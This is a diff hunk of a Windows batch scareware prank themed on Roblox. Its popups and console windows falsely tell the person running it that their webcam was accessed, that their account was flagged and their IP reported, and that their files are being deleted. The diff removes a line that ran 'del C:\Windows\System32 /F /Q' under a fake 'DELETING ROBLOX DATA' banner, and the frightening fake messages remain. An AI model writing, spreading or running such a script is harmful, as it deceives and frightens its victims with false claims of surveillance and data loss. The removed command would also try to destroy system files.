@@ -9315,7 +9315,7 @@ start mshta vbscript:msgbox("Your webcam has been accessed by RobloxInjector.exe
 pause
 start cmd.exe /k "color 4F && title ROBLOX BAN SYSTEM && echo ROBLOX ANTI-CHEAT SYSTEM DETECTED! && echo Your account has been flagged for review. && echo IP Reported: %computername% && pause"
 
-start cmd.exe /k "color C0 && title DELETING ROBLOX DATA && echo WARNING: Your files are being deleted! && ping -n 2 127.0.0.1 >nul && del C:\Windows\System32 /F /Q && echo ERROR: Access Denied && pause"
+start cmd.exe /k "color C0 && title DELETING ROBLOX DATA && echo WARNING: Your files are being deleted! && ping -n 2 127.0.0.1 >nul && echo ERROR: Access Denied && pause"
 
 start cmd.exe /k "color 0C && title CRITICAL ERROR && echo SYSTEM FAILURE DETECTED! && :flash && color 4F && ping -n 1 127.0.0.1 >nul && color 0F && ping -n 1 127.0.0.1 >nul && goto flash"
 pause
